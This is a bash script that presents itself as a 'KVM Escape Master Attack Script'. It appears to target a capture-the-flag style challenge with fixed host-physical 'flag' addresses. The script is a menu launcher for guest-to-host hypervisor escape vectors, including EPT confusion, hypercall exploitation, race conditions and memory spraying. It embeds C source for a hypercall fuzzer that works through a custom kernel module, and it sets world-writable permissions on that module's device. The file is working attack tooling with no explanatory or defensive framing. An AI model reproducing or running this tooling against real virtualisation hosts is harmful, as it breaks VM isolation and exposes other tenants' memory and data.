#!/bin/bash

# KVM Escape Master Attack Script
# ================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
TARGET_READ_FLAG="0x695ee10"
TARGET_WRITE_FLAG="0x64279a8"
DEVICE="/dev/kvm_probe_dev"

print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║       ██╗  ██╗██╗   ██╗███╗   ███╗    ███████╗███████╗ ██████╗ ║
║       ██║ ██╔╝██║   ██║████╗ ████║    ██╔════╝██╔════╝██╔════╝ ║
║       █████╔╝ ██║   ██║██╔████╔██║    █████╗  ███████╗██║      ║
║       ██╔═██╗ ╚██╗ ██╔╝██║╚██╔╝██║    ██╔══╝  ╚════██║██║      ║
║       ██║  ██╗ ╚████╔╝ ██║ ╚═╝ ██║    ███████╗███████║╚██████╗ ║
║       ╚═╝  ╚═╝  ╚═══╝  ╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ║
║                                                                  ║
║              Guest-to-Host Exploitation Framework               ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

check_prerequisites() {
    print_status "Checking prerequisites..."
    
    # Check if device exists
    if [ ! -c "$DEVICE" ]; then
        print_error "Device $DEVICE not found"
        print_warning "Run './build.sh' first to compile and load the kernel module"
        exit 1
    fi
    
    # Check if we can access device
    if [ ! -r "$DEVICE" ] || [ ! -w "$DEVICE" ]; then
        print_warning "Device not accessible, trying to fix permissions..."
        sudo chmod 666 "$DEVICE"
    fi
    
    # Check if tools are built
    if [ ! -f "./kvm_escape_advanced" ]; then
        print_error "kvm_escape_advanced not found"
        print_warning "Run './build.sh' first"
        exit 1
    fi
    
    if [ ! -f "./address_space_attack" ]; then
        print_error "address_space_attack not found"
        print_warning "Run './build.sh' first"
        exit 1
    fi
    
    print_success "All prerequisites met"
}

show_targets() {
    echo ""
    echo -e "${MAGENTA}Target Information:${NC}"
    echo "  Read Flag  (HPA): $TARGET_READ_FLAG"
    echo "  Write Flag (HPA): $TARGET_WRITE_FLAG"
    echo ""
}

show_menu() {
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}                   ATTACK MENU                             ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "  [Quick Attacks - Try These First]"
    echo ""
    echo "  1) Quick scan - Fast vectors only (1,3,5)"
    echo "  2) Address space aliasing attack"
    echo "  3) All standard vectors (1-6)"
    echo ""
    echo "  [Individual Vectors]"
    echo ""
    echo "  4) Vector 1: Direct HPA access"
    echo "  5) Vector 2: MMIO region scanning"
    echo "  6) Vector 3: Hypercall exploitation"
    echo "  7) Vector 4: GPA space expansion"
    echo "  8) Vector 5: EPT confusion"
    echo "  9) Vector 6: Port I/O tricks"
    echo " 10) Vector 7: Race conditions (5 sec)"
    echo " 11) Vector 8: Memory scan (SLOW!)"
    echo ""
    echo "  [Advanced Attacks]"
    echo ""
    echo " 12) Full assault - Everything"
    echo " 13) Custom hypercall fuzzing"
    echo " 14) Memory pattern spray"
    echo ""
    echo "  [Utilities]"
    echo ""
    echo " 15) Check system information"
    echo " 16) Monitor kernel logs (Ctrl+C to stop)"
    echo " 17) Reload kernel module"
    echo " 18) Run original kvm_prober tool"
    echo ""
    echo "  0) Exit"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
}

run_quick_scan() {
    print_status "Running quick scan (fast vectors)..."
    echo ""
    
    print_status "Vector 1: Direct HPA access"
    ./kvm_escape_advanced 1 | tee /tmp/vector1.log
    
    print_status "Vector 3: Hypercall exploitation"
    ./kvm_escape_advanced 3 | tee /tmp/vector3.log
    
    print_status "Vector 5: EPT confusion"
    ./kvm_escape_advanced 5 | tee /tmp/vector5.log
    
    echo ""
    print_success "Quick scan complete"
    print_status "Check /tmp/vector*.log for detailed output"
}

run_address_space_attack() {
    print_status "Running address space aliasing attack..."
    print_warning "This will allocate significant memory"
    echo ""
    
    ./address_space_attack | tee /tmp/address_space.log
    
    echo ""
    print_success "Attack complete"
    print_status "Check /tmp/address_space.log for detailed output"
}

run_all_standard() {
    print_status "Running all standard vectors (1-6)..."
    echo ""
    
    for i in {1..6}; do
        print_status "Vector $i"
        ./kvm_escape_advanced $i | tee /tmp/vector$i.log
        echo ""
    done
    
    print_success "All standard vectors complete"
}

run_individual_vector() {
    local vector=$1
    print_status "Running Vector $vector..."
    echo ""
    
    ./kvm_escape_advanced $vector | tee /tmp/vector$vector.log
    
    echo ""
    print_success "Vector $vector complete"
}

run_full_assault() {
    print_warning "This will run ALL attack vectors including slow ones!"
    read -p "Are you sure? (y/N): " confirm
    
    if [ "$confirm" != "y" ] && [ "$confirm" != "Y" ]; then
        print_status "Cancelled"
        return
    fi
    
    print_status "Running full assault..."
    echo ""
    
    # Run all vectors
    for i in {1..8}; do
        print_status "Vector $i"
        ./kvm_escape_advanced $i | tee /tmp/vector$i.log
        echo ""
    done
    
    # Run address space attack
    print_status "Address space attack"
    ./address_space_attack | tee /tmp/address_space.log
    
    echo ""
    print_success "Full assault complete"
    print_status "Check /tmp/*.log for detailed outputs"
}

check_system_info() {
    print_status "System Information"
    echo ""
    
    echo "=== Guest VM Info ==="
    echo "Kernel: $(uname -r)"
    echo "Architecture: $(uname -m)"
    echo ""
    
    echo "=== CPU Info ==="
    grep "model name" /proc/cpuinfo | head -1
    echo "CPUs: $(nproc)"
    echo ""
    
    echo "=== Memory Info ==="
    free -h
    echo ""
    
    echo "=== Guest RAM Regions ==="
    grep "System RAM" /proc/iomem | head -5
    echo ""
    
    echo "=== KVM Module ==="
    if lsmod | grep -q kvm_probe; then
        print_success "kvm_probe_drv loaded"
        lsmod | grep kvm_probe
    else
        print_error "kvm_probe_drv NOT loaded"
    fi
    echo ""
    
    echo "=== Device ==="
    ls -la $DEVICE
    echo ""
}

monitor_logs() {
    print_status "Monitoring kernel logs (Press Ctrl+C to stop)..."
    echo ""
    sudo dmesg -w | grep --line-buffered -E "kvm_probe|HYPERCALL|GPA|HPA|flag"
}

reload_module() {
    print_status "Reloading kernel module..."
    
    sudo rmmod kvm_probe_drv 2>/dev/null || true
    sleep 1
    
    if [ ! -f "kvm_probe_drv.ko" ]; then
        print_error "kvm_probe_drv.ko not found"
        print_warning "Run './build.sh' first"
        return
    fi
    
    sudo insmod kvm_probe_drv.ko
    sudo chmod 666 $DEVICE
    
    if [ -c "$DEVICE" ]; then
        print_success "Module reloaded successfully"
    else
        print_error "Failed to reload module"
    fi
}

run_original_tool() {
    if [ ! -f "./kvm_prober" ]; then
        print_warning "Original kvm_prober not found"
        print_status "Compiling from kvm_prober.c..."
        
        if [ -f "kvm_prober.c" ]; then
            gcc -o kvm_prober kvm_prober.c -Wall
            print_success "Compiled kvm_prober"
        else
            print_error "kvm_prober.c not found"
            return
        fi
    fi
    
    print_status "Original kvm_prober tool"
    echo ""
    echo "Usage: ./kvm_prober <command> [args]"
    echo ""
    echo "Try:"
    echo "  ./kvm_prober readgpa $TARGET_READ_FLAG 256"
    echo "  ./kvm_prober readhpa $TARGET_READ_FLAG 256"
    echo "  ./kvm_prober alloc_shared"
    echo "  ./kvm_prober hypercall 101 $TARGET_READ_FLAG <gpa> 256 0"
    echo ""
}

custom_hypercall_fuzz() {
    print_status "Custom hypercall fuzzing"
    print_warning "This will try many hypercall numbers"
    echo ""
    
    read -p "Start hypercall number (default 0): " start
    start=${start:-0}
    
    read -p "End hypercall number (default 255): " end
    end=${end:-255}
    
    print_status "Fuzzing hypercalls $start to $end..."
    
    # First allocate shared buffer
    print_status "Allocating shared buffer..."
    echo ""
    
    cat > /tmp/fuzz_hypercalls.c << 'EOFUZZ'
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <unistd.h>

#define IOCTL_ALLOC_SHARED_BUF 0x101B
#define IOCTL_HYPERCALL_ARGS 0x1012
#define IOCTL_READ_SHARED_BUF 0x101C

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0, arg1, arg2, arg3;
    long ret_value;
};

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <start> <end>\n", argv[0]);
        return 1;
    }
    
    int start = atoi(argv[1]);
    int end = atoi(argv[2]);
    
    int fd = open("/dev/kvm_probe_dev", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    unsigned long shared_gpa;
    if (ioctl(fd, IOCTL_ALLOC_SHARED_BUF, &shared_gpa) < 0) {
        perror("alloc shared");
        return 1;
    }
    
    printf("[+] Shared buffer @ GPA 0x%lx\n\n", shared_gpa);
    
    for (int nr = start; nr <= end; nr++) {
        struct hypercall_args args = {
            .nr = nr,
            .arg0 = 0x64279a8,
            .arg1 = shared_gpa,
            .arg2 = 256,
            .arg3 = 0
        };
        
        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) == 0) {
            printf("[%3d] ret=%-20ld (0x%016lx)\n", nr, args.ret_value, args.ret_value);
            
            if (args.ret_value > 0 && args.ret_value < 4096) {
                unsigned char buf[4096];
                if (ioctl(fd, IOCTL_READ_SHARED_BUF, buf) == 0) {
                    int has_data = 0;
                    for (int i = 0; i < 256; i++) {
                        if (buf[i] != 0) { has_data = 1; break; }
                    }
                    if (has_data) {
                        printf("      [!] Buffer has data!\n");
                    }
                }
            }
        }
    }
    
    close(fd);
    return 0;
}
EOFUZZ
    
    gcc -o /tmp/fuzz_hypercalls /tmp/fuzz_hypercalls.c
    /tmp/fuzz_hypercalls $start $end | tee /tmp/hypercall_fuzz.log
    
    print_success "Fuzzing complete"
    print_status "Results in /tmp/hypercall_fuzz.log"
}

memory_pattern_spray() {
    print_status "Memory pattern spray attack"
    print_status "Using address_space_attack tool..."
    echo ""
    
    ./address_space_attack | tee /tmp/pattern_spray.log
    
    print_success "Pattern spray complete"
}

# Main loop
main() {
    print_banner
    check_prerequisites
    show_targets
    
    while true; do
        show_menu
        read -p "Select option: " choice
        
        echo ""
        
        case $choice in
            0)
                print_status "Exiting..."
                exit 0
                ;;
            1)
                run_quick_scan
                ;;
            2)
                run_address_space_attack
                ;;
            3)
                run_all_standard
                ;;
            4)
                run_individual_vector 1
                ;;
            5)
                run_individual_vector 2
                ;;
            6)
                run_individual_vector 3
                ;;
            7)
                run_individual_vector 4
                ;;
            8)
                run_individual_vector 5
                ;;
            9)
                run_individual_vector 6
                ;;
            10)
                run_individual_vector 7
                ;;
            11)
                run_individual_vector 8
                ;;
            12)
                run_full_assault
                ;;
            13)
                custom_hypercall_fuzz
                ;;
            14)
                memory_pattern_spray
                ;;
            15)
                check_system_info
                ;;
            16)
                monitor_logs
                ;;
            17)
                reload_module
                ;;
            18)
                run_original_tool
                ;;
            *)
                print_error "Invalid option"
                ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
        clear
        print_banner
        show_targets
    done
}

# Run main
main
